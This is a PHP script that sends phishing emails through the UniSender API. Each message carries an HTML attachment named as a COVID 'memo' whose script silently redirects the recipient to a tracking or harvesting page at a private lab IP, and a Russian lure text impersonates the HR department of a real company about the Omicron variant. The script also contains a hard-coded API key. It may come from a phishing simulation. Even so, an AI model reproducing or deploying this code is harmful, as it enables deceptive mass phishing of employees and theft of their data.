<?php

//UniSender
require_once("UniSender/UnisenderApi.php"); //подключаем файл класса
$apikey="6p3j1sfawsw173x9daajgwczuwpszz9nzfzm46ee"; //API-ключ к вашему кабинету


//mails
$mails = array("");
foreach ($mails as $value) {
  //file
  $ft = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body></body><script>window.location.href='http://10.0.2.4/sqlpast/index.php?mail=$value';</script></html>";
  $fp = fopen("Памятка.html", "w");
  fwrite($fp, $ft);
  fclose($fp);
  echo("File " . $value . " created <br>");
  
  //message
  $subject = "Омикрон-штамм коронавируса, важная информация";
  //$message = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'></head><body><img src='/ru/user_file?resource=images&name=mshead.png'><font size='2' face='Arial'><p>Уважаемые коллеги!<br><br>В связи с выявлением в системе организаций АО «ДОМ.РФ» единичных случаев заражения новым штаммом коронавируса <b>Омикрон</b> требуется выполнять ряд рекомендаций и мер предосторожности для предотвращения распространения  опасной инфекции. Подробные инструкции приведены в Памятке.<br><br><b>Омикрон отличается от предыдущих вариантов коронавирусной инфекции большим количеством новых мутаций, свыше 30 из которых находятся в белке шипа коронавируса (spike-protein, или S-белок). В числе главных опасностей – устойчивость Омикрона к иммунитету привитых и переболевших коронавирусом.</b><br><br><br>Спасибо за понимание!</p><img src='/ru/user_file?resource=images&name=msfoot.jpg'><p>С наилучшими пожеланиями,<br>Управление персоналом, Обеспечение офиса</p></font></body></html>";
  
  //send
  $params = [
    'format' => 'json',
    'api_key' => "6p3j1sfawsw173x9daajgwczuwpszz9nzfzm46ee",
    'email' => $value,
    'sender_name' => "Andrey",
    'sender_email' => "andrey.kazako75@gmail.com",
    'subject' => $subject,
    'body' => file_get_contents("message.html"),
    'list_id' => "1",
    'attachments[Памятка.html]' => file_get_contents("Памятка.html")
];

$url="https://api.unisender.com/ru/api/sendEmail";

if( $curl = curl_init() ) {
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $params);
    $response = curl_exec($curl);
    echo $response;
    curl_close($curl);
}
echo('<br>');
  
  }
?>
